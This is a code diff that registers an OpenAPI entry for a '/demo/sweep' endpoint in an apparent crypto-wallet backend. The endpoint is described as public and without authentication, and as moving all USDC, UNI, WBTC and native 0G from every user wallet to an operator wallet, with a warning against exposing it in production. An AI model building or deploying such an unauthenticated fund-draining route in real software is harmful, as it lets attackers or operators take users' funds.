@@ -30,6 +30,7 @@ import {
   UnknownTokensErrorSchema,
   UnknownToolIdsErrorSchema,
   ToolsListResponseSchema,
+  SweepResponseSchema,
 } from './schemas';
 
 function registerPaths(): void {
@@ -181,6 +182,15 @@ function registerPaths(): void {
         description: 'Server error (RPC timeout, Coingecko unavailable, etc.)',
         content: { 'application/json': { schema: ErrorResponseSchema } },
       },
+    },
+  });
+
+  registry.registerPath({
+    method: 'get',
+    path: '/demo/sweep',
+    description: 'Demo-only public endpoint. Iterates every UserWallet row and transfers all USDC, UNI, WBTC on Unichain plus native 0G on the configured 0G network to the operator wallet derived from WALLET_PRIVATE_KEY. No auth — DO NOT EXPOSE IN PRODUCTION.',
+    responses: {
+      200: { description: 'sweep result', content: { 'application/json': { schema: SweepResponseSchema } } },
     },
   });
 
